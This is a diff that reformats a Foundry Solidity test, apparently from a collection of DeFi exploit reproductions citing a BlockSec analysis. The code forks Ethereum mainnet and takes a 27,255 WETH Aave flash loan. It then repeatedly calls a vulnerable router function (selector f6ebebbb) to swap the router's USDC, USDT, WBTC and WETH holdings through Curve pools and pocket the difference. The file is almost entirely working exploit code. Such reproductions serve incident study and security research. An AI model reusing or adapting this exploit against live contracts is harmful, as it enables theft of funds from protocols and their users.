@@ -12,18 +12,13 @@ import "./interface.sol";
 
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1722101942061601052
-interface ISmartVaultManagerV2{
-    function mint()external;
+interface ISmartVaultManagerV2 {
+    function mint() external;
     function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external;
 }
 
-interface ICurve{
-    function exchange(
-        uint256 i,
-        uint256 j,
-        uint256 dx,
-        uint256 min_dy
-    ) external;
+interface ICurve {
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
 }
 
 interface ISwapFlashLoan {
@@ -40,6 +35,7 @@ contract ContractTest is Test {
     ICurve firstCrvPool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
     ICurve secondCrvPool = ICurve(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
     struct ExactInputSingleParams {
         address tokenIn;
         address tokenOut;
@@ -49,43 +45,78 @@ contract ContractTest is Test {
         uint256 amountOutMinimum;
         uint160 limitSqrtPrice;
     }
-    function setUp() public {
-        vm.createSelectFork("mainnet", 18523344 - 1);
-        cheats.label(address(weth),"WETH");
-        cheats.label(address(secondCrvPool),'Curve.fi: USDT/WBTC/WETH Pool');
-    }
-    function testExpolit()public{
-        emit log_named_decimal_uint("attacker balance before attack",weth.balanceOf(address(this)),weth.decimals());
 
-        aave.flashLoanSimple(address(this),address(weth),27255000000000000000000,new bytes(1), 0);
-        emit log_named_decimal_uint("attacker balance after attack",weth.balanceOf(address(this)),weth.decimals());
+    function setUp() public {
+        vm.createSelectFork("mainnet", 18_523_344 - 1);
+        cheats.label(address(weth), "WETH");
+        cheats.label(address(secondCrvPool), "Curve.fi: USDT/WBTC/WETH Pool");
     }
+
+    function testExpolit() public {
+        emit log_named_decimal_uint("attacker balance before attack", weth.balanceOf(address(this)), weth.decimals());
+
+        aave.flashLoanSimple(address(this), address(weth), 27_255_000_000_000_000_000_000, new bytes(1), 0);
+        emit log_named_decimal_uint("attacker balance after attack", weth.balanceOf(address(this)), weth.decimals());
+    }
+
     function executeOperation(
         address asset,
         uint256 amount,
         uint256 premium,
         address initator,
         bytes calldata params
-    ) external payable returns (bool){
-        weth.approve(address(aave),type(uint).max);
+    ) external payable returns (bool) {
+        weth.approve(address(aave), type(uint256).max);
         bytes4 vulnFunctionSignature = hex"f6ebebbb";
-        bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, usdc.balanceOf(address(router)),0,address(usdc),address(usdt),address(firstCrvPool), 0,0);
-        (bool success,bytes memory result) = address(router).call(data);
-        data = abi.encodeWithSelector(vulnFunctionSignature, usdt.balanceOf(address(router)),0,address(usdt),address(weth),address(secondCrvPool), 0,0);
-        (success,result) = address(router).call(data);
-        data = abi.encodeWithSelector(vulnFunctionSignature, wbtc.balanceOf(address(router)),0,address(wbtc),address(weth),address(secondCrvPool), 0,0);
-        (success,result) = address(router).call(data);
+        bytes memory data = abi.encodeWithSelector(
+            vulnFunctionSignature,
+            usdc.balanceOf(address(router)),
+            0,
+            address(usdc),
+            address(usdt),
+            address(firstCrvPool),
+            0,
+            0
+        );
+        (bool success, bytes memory result) = address(router).call(data);
+        data = abi.encodeWithSelector(
+            vulnFunctionSignature,
+            usdt.balanceOf(address(router)),
+            0,
+            address(usdt),
+            address(weth),
+            address(secondCrvPool),
+            0,
+            0
+        );
+        (success, result) = address(router).call(data);
+        data = abi.encodeWithSelector(
+            vulnFunctionSignature,
+            wbtc.balanceOf(address(router)),
+            0,
+            address(wbtc),
+            address(weth),
+            address(secondCrvPool),
+            0,
+            0
+        );
+        (success, result) = address(router).call(data);
 
-        weth.approve(address(secondCrvPool),type(uint).max);
-        secondCrvPool.exchange(2,1,weth.balanceOf(address(this)),0);
-        data = abi.encodeWithSelector(vulnFunctionSignature, weth.balanceOf(address(router)),0,address(weth),address(wbtc),address(secondCrvPool), 0,0);
-        (success,result) = address(router).call(data);
-        wbtc.approve(address(secondCrvPool),type(uint).max);
-        secondCrvPool.exchange(1,2,wbtc.balanceOf(address(this)),0);
+        weth.approve(address(secondCrvPool), type(uint256).max);
+        secondCrvPool.exchange(2, 1, weth.balanceOf(address(this)), 0);
+        data = abi.encodeWithSelector(
+            vulnFunctionSignature,
+            weth.balanceOf(address(router)),
+            0,
+            address(weth),
+            address(wbtc),
+            address(secondCrvPool),
+            0,
+            0
+        );
+        (success, result) = address(router).call(data);
+        wbtc.approve(address(secondCrvPool), type(uint256).max);
+        secondCrvPool.exchange(1, 2, wbtc.balanceOf(address(this)), 0);
         return true;
     }
-
-
-
-
 }
